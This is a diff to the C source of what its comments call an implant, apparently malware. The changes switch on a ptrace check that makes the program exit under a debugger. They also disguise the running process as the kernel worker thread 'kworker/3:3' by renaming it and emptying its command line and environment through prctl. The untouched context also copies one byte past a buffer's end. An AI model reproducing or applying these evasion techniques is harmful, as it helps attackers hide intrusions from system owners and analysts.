@@ -7,14 +7,14 @@ int main(int argc, char **argv, char **envp) {
         return 1;
     }
 
-    void *empty = NULL;
+    const void *empty = NULL;
     size_t ip_len = strlen(argv[1]);
     char target[ip_len];
 
     // detect if a debugger is used against our implant
-    // if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
-    //     return 1;
-    // }
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
+        return 1;
+    }
 
     strncpy(target, argv[1], ip_len);
 
@@ -26,11 +26,15 @@ int main(int argc, char **argv, char **envp) {
 
     // save the arg for later
     strncpy(target, argv[1], ip_len + 1);
+    static char *cmdline = "[kworker/3:3]";
 
     // process masquerading, change the command name associated with the process
-    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL); // modifies /proc/<PID>/status
-    strncpy(argv[0], "[kworker/3:3]\0", strlen(argv[0]) + 1); // modifies /proc/<pid>/cmdline
-    strncpy(argv[1], "\0", strlen(argv[1]));
+    // empty out /proc/<PID>/cmdline
+    prctl(PR_SET_MM, PR_SET_MM_ARG_START, &empty, NULL, NULL);
+    prctl(PR_SET_MM, PR_SET_MM_ARG_END, &empty, NULL, NULL);
+
+    // no brackets there just like kernel threads do
+    prctl(PR_SET_NAME, "kworker/3:3", NULL, NULL, NULL); // modifies /proc/<PID>/status
 
     // kworker thread doesn't have any env variables
     prctl(PR_SET_MM, PR_SET_MM_ENV_START, &empty, NULL, NULL);
